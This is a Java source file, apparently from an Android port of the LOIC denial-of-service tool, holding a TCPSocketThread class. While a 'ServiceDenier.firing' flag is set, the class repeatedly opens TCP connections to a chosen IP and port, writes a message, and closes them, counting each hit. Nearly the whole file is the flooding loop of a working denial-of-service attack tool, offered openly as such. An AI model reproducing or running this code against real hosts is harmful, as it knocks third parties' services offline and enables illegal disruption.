package genius.mohammad.loic;

/**
 * Copyright 2013 Mohammad Adib
 * 
 * Licensed under the Apache License, Version 2.0 (the "License"); you may
 * not use this file except in compliance with the License. You may obtain a
 * copy of the License at
 * 
 * http://www.apache.org/licenses/LICENSE-2.0
 * 
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
 * WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
 * License for the specific language governing permissions and limitations
 * under the License.
 */

import java.io.OutputStreamWriter;
import java.net.InetSocketAddress;
import java.net.Socket;

public class TCPSocketThread implements Runnable {

	private String ip, message;
	private int port, timeout, pause;
	
	public static long startTime = 0;
	public static int count = 0;

	public TCPSocketThread(String ip, int port, int timeout, String message, int pause) {
		this.ip = ip;
		this.port = port;
		this.timeout = timeout;
		this.message = message;
		this.pause = pause;
	}

	public void run() {
		count = 0;
		startTime = System.currentTimeMillis();
		Socket socket;
		while (ServiceDenier.firing) {
			try {
				socket = new Socket();
				socket.connect(new InetSocketAddress(ip, port), timeout);
				OutputStreamWriter out = new OutputStreamWriter(socket.getOutputStream());
				out.write(message);
				out.close();
				socket.close();
				count++;
				Thread.sleep(pause);
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}
}
